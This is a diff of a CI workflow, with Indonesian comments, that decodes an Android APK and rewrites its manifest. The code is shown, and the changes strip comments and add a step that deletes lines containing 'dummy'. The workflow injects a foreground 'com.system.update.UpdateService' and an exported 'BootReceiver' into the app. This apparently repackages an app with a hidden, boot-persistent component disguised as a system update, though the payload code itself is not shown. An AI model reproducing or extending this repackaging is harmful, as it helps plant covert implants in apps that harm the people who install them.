@@ -121,7 +121,6 @@ jobs:
               root = tree.getroot()
           except ET.ParseError as e:
               print(f"❌ Error parsing XML: {e}")
-              # Jika gagal, gunakan lxml
               from lxml import etree
               parser = etree.XMLParser(recover=True)
               root = etree.parse(manifest_path, parser).getroot()
@@ -154,14 +153,12 @@ jobs:
 
           # 6. Tambahkan service dan receiver ke dalam <application>
           if application is not None:
-              # Service UpdateService
               service = ET.Element('service')
               service.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.UpdateService')
               service.set('{http://schemas.android.com/apk/res/android}exported', 'false')
               service.set('{http://schemas.android.com/apk/res/android}foregroundServiceType', 'dataSync')
               application.append(service)
 
-              # Receiver BootReceiver
               receiver = ET.Element('receiver')
               receiver.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.BootReceiver')
               receiver.set('{http://schemas.android.com/apk/res/android}exported', 'true')
@@ -177,9 +174,14 @@ jobs:
 
           # 7. Tulis ulang AndroidManifest.xml dengan format yang bagus
           tree.write(manifest_path, encoding='utf-8', xml_declaration=True)
-
           print("✅ AndroidManifest.xml berhasil dimodifikasi dengan aman")
           EOF
+
+      - name: Clean dummy references from AndroidManifest.xml
+        run: |
+          # 🔥 Hapus semua baris yang mengandung "dummy" dari manifest
+          sed -i '/dummy/d' decoded/AndroidManifest.xml
+          echo "✅ Referensi dummy dihapus dari manifest"
 
       - name: Clean dummy files and references
         run: |
